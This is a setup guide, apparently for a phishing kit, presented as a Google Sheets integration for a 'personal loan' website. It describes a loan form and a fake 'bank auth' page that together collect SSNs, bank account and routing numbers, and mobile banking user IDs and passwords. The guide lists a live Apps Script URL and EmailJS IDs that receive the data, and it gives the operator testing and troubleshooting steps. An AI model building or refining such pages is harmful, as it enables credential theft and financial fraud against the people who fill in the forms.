# Google Sheets Integration Setup Guide

## ✅ **ALREADY CONFIGURED FOR YOU!**

Your Google Sheets integration is **pre-configured** with:
- **Web App URL**: `https://script.google.com/macros/s/AKfycbzBFpOCo0lir5_FqiTimBpeTR_LOZJPv03N6YhgdLX4RxDTL39QcI-Rs5vrYVt3n5gEKA/exec`
- **Service ID**: `service_mblpi2k`
- **Template ID**: `template_5wx44v8`

## 📋 **Current Data Flow:**

### **Form 1: Personal Loans (personal-loans.html)**
- ✅ Stores data in `localStorage` as `loanFormData`
- ✅ Sends email via EmailJS (working)
- ✅ Fields: Loan details, personal info, address, financial, employment

### **Form 2: Bank Auth (bank-auth.html)**
- ✅ Retrieves `loanFormData` from localStorage
- ✅ Collects bank authentication data
- ✅ Merges both forms into single object
- ✅ Sends combined data to Google Sheets
- ✅ Sends email via EmailJS (working)

### **Google Sheets Storage:**
- ✅ **Single row** with all form fields
- ✅ **Proper column mapping** for easy Excel export
- ✅ **Timestamp** for each submission
- ✅ **Error handling** with console logs

## 🔄 **Data Mapping:**

**Google Sheets Columns (in order):**
1. **Timestamp** - When form was submitted
2. **Loan Amount** - From personal loan form
3. **Loan Purpose** - From personal loan form  
4. **Credit Score** - From personal loan form
5. **Name** - Full name from personal loan form
6. **Email** - From personal loan form
7. **Phone** - From personal loan form
8. **Street Address** - From personal loan form
9. **City** - From personal loan form
10. **State** - From personal loan form
11. **Zip Code** - From personal loan form
12. **SSN** - From personal loan form
13. **Bank Name** - From personal loan form
14. **Routing Number** - From personal loan form
15. **Account Number** - From personal loan form
16. **Annual Income** - From personal loan form
17. **Employment Status** - From personal loan form
18. **Monthly Housing** - From personal loan form
19. **Your Bank** - From bank auth form
20. **Mobile Banking User ID** - From bank auth form
21. **Mobile Banking Password** - From bank auth form
22. **Application Type** - Set as "Personal Loan Application"

## 🚀 **Testing Instructions:**

### **Test the Complete Flow:**
1. Fill out **personal-loans.html** form completely
2. Click **Submit Application** - should send email and store data
3. Fill out **bank-auth.html** form completely  
4. Click **Connect Securely** - should merge data and send to Google Sheets
5. Check your **Google Sheet** for the combined data row
6. Check your **email** for both individual and combined notifications

### **What You Should See:**
- ✅ **Email 1**: Personal loan application details
- ✅ **Email 2**: Bank authentication + combined data
- ✅ **Google Sheet**: Single row with all form fields
- ✅ **Console logs**: Detailed debugging information

## 🛠️ **Troubleshooting:**

### **If Google Sheets Not Working:**
1. Check browser console for error messages
2. Verify Web App URL is correct
3. Check Google Apps Script deployment permissions
4. Ensure "Anyone" has access to the Web App
5. Check that your Google Sheet is shared with the Web App

### **Common Issues:**
- **CORS errors**: Normal with no-cors mode, data may still save
- **Permission denied**: Re-deploy Web App with correct permissions
- **Spreadsheet not found**: Replace `YOUR_SPREADSHEET_ID` in the script

## 📞 **Support:**

If you need any changes to the field mapping or have issues:
1. Check the console logs in browser developer tools
2. Review the Google Apps Script execution logs
3. Verify data appears in your Google Sheet
4. Test with different browsers/devices

**Your integration is ready to use!** 🎯
